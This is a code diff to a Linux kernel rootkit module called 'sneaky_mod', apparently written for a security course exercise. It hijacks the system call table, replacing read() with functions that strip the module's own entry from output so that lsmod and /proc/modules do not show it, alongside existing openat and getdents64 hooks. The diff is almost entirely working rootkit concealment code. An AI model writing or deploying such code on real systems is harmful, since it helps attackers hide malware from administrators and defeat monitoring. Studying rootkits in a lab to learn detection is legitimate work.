@@ -116,9 +116,56 @@ asmlinkage int fake_getdents64(struct pt_regs *regs)
 
 asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
-// asmlinkage ssize_t fake_read(struct pt_regs *regs)
-// {
-// }
+asmlinkage ssize_t fake_read(struct pt_regs *regs)
+{
+  ssize_t res_proc;
+  char *buffer, *read_start;
+  res_proc = (*original_read)(regs);
+
+  if (res_proc <= 0)
+  {
+    return res_proc;
+  }
+
+  // Check if reading /proc/modules
+  if (strcmp(current->comm, "lsmod") == 0)
+  {
+    buffer = (char *)regs->si;
+    read_start = strstr(buffer, "sneaky_mod");
+    if (read_start != NULL)
+    {
+      char *read_end = strchr(read_start, '\n');
+      if (read_end != NULL)
+      {
+        read_end++;
+        memmove(read_start, read_end, (buffer + res_proc) - read_end);
+        res_proc -= (read_end - read_start);
+      }
+    }
+  }
+  return res_proc;
+}
+
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
+{
+  ssize_t bytesRead = (*original_read)(regs);
+
+  if (bytesRead > 0)
+  {
+    void *posStart = strnstr((char *)(regs->si), "sneaky_mod", bytesRead);
+    if (posStart != NULL)
+    {
+      void *posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void *)(regs->si)));
+      if (posEnd != NULL)
+      {
+        int size = posEnd - posStart + 1;
+        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void *)(regs->si)) - size);
+        bytesRead -= size;
+      }
+    }
+  }
+  return bytesRead;
+}
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -143,6 +190,7 @@ static int initialize_sneaky_module(void)
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)fake_getdents64;
   // sys_call_table[__NR_read] = (unsigned long)fake_read;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
 
@@ -163,6 +211,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
